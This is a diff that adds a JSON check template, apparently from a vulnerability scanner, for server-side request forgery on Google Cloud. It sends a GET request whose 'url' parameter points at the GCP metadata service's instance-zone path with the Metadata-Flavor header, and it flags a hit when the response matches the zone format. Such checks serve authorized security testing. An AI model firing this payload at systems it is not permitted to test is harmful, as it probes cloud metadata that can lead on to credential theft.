@@ -1,0 +1,30 @@
+{
+  "name": "web/SSRF GCP metadata instance zone read",
+  "description": "[high] Proves SSRF reaching Google Cloud metadata via url param: computeMetadata/v1/instance/zone returns projects/<n>/zones/<region> = metadata service reachable from app context (T1552.005). Keywords: ssrf gcp google metadata cloud instance zone imds. ctrl: egress-blocked error lacks zone shape -> not falsified. base_url = endpoint fetching attacker-supplied url.",
+  "cwe": "CWE-918",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/fetch?url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2Finstance%2Fzone",
+      "headers": {
+        "Metadata-Flavor": "Google"
+      }
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "projects/\\d+/zones/[a-z]+-[a-z]+\\d",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "56bde9b0a035",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
